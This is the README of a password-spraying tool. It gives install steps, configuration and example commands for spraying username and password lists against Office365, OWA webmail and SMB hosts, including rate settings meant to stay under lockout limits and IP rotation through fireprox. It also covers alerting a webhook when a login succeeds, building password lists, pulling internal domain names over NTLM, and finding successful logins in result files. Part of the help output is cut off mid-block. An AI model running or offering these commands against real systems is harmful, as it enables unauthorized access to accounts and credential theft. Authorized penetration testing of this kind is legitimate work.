## Install ##

#### Using pipenv ####
```bash
git clone https://github.com/Tw1sm/spraycharles.git && cd spraycharles
pipenv --python 3 shell
pip3 install -r requirements.txt
./spraycharles.py -h
```


#### Using Docker ####
Build the container using the included Dockerfile.

```bash
git clone https://github.com/Tw1sm/spraycharles.git && cd spraycharles
docker build . -t spraycharles
```

You will most likely want to save and use a list of usernames and passwords during spraying. The easiest way to do this is by mapping a directory on your host with the container. Use the following command in Bash to map your present working directory to the spraycharles install directory inside the running container.

```bash
docker run -it -v $(pwd):/spraycharles/ spraycharles -h
```

Following your first run of the command above, a sparycharles directory will be created on your system where you can add username and password lists as well as access spraying logs. 

#### From GitHub
```bash
$ git clone https://github.com/Tw1sm/spraycharles.git
$ cd spraycharles
$ pip3 install -r requirements.txt
$ ./spraycharles.py -h
```

  --analyze                       Run the results analyzer after each spray
                                  interval. False positives are more likely
  --pause                         Pause the spray following a potentially
                                  successful login
  -j, --jitter INTEGER            Jitter time between requests in seconds.
  -jm, --jitter-min INTEGER       Minimum time between requests in seconds.
  -n, --notify [teams|slack|discord]
                                  Enable notifications for Slack, MS Teams or

  -h, --help                      Show this message and exit.
```

#### Config File 
It is possible to pre-populate command line arguments form a configuration file using the `--config` argument.

An example configuration file is listed below:

```
userlist = '/tmp/users.txt'
passlist = '/tmp/passwords.txt'
csvfile = 'mail.acme.com.csv'
module = 'owa'
host = 'mail.acme.com'
domain = 'ACME'
analyze_results = 'True'
attempts = '1'
interval = '30'
timeout = '25'
```

Note: Due to internal script logic the following variables must be defined differently than they would be via CLI:

* usernames = userlist
* passwords = passlist
* output = csvfile
* analyze = analyze_results

<br/>


### Notifications ###
Spraycharles has the ability to issue notifications to Discord, Slack and Microsoft Teams following a potentially successful login attempt. This list of notification providers can augmented using the utils/notify.py script. For any of the potential notification agents, you must specify its name and a webhook URL. 

It is best to specify this information using the configuration file to keep your command shorter:

```
notify = 'slack'
webhook = 'https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX'
```

Notifications sent to any of the providers will include the targeted hostname associated with the spraying job. This is expecially useful when spraying multiple targets at once using spraycharles. 

<br/>

### Examples ###
Basic usage (Office365)
```
./spraycharles.py -u users.txt -p passwords.txt -m Office365
```
Basic usage (non-Office365) with a single password, supplied via command line
```
./spraycharles.py -u users.txt -H webmail.company.com -p Password123 -m owa
```
Attempt 5 logins per user every 20 minutes
```
./spraycharles.py -n users.txt -H webmail.company.com -p passwords.txt -i 20 -a 5 -m owa
```
Usage with fireprox (Office365)
```
./spraycharles.py -u users.txt -p passwords.txt -m office365 -f abcdefg.execute-api.us-east-1.amazonawms.com
```
Spray host over SMB with 2 attempts per user every hour
```
./spraycharles.py -u users.txt -p passwords.txt -m Smb -H 10.10.1.5 -a 2 -i 60
```

<br/>

## Utilities ##
Spraycharles is packaged with some additional utilities to assist with spraying efforts.
<br/>

#### Generating Custom Spray Lists 
make_list.py will generate a password list based off the specifications provided in list_elements.json
```
./utils/make_list.py
```

<br/>

#### Extracting Domain from NTLM over HTTP and SMB 
ntlm_challenger.py will extract the internal domain from both NTLM over HTTP and SMB services using a command similar to the one listed below.


```
./utils/ntlm_challenger.py https://mail.acme.com/ews
```

<br/>

### Analyzing the results CSV file ###
`analyze.py` can read your output CSV and determine response lengths that are statistically relevant. With enough data, it should be able to pull successful logins out of your CSV file. This is not the only way to determine successful logins, depending on your target site, and I would still recommend checking the data yourself to be sure nothing is missed. For SMB, it will simply find entries that contain "SUCCESS"
```
./analyze.py myresults.csv
```
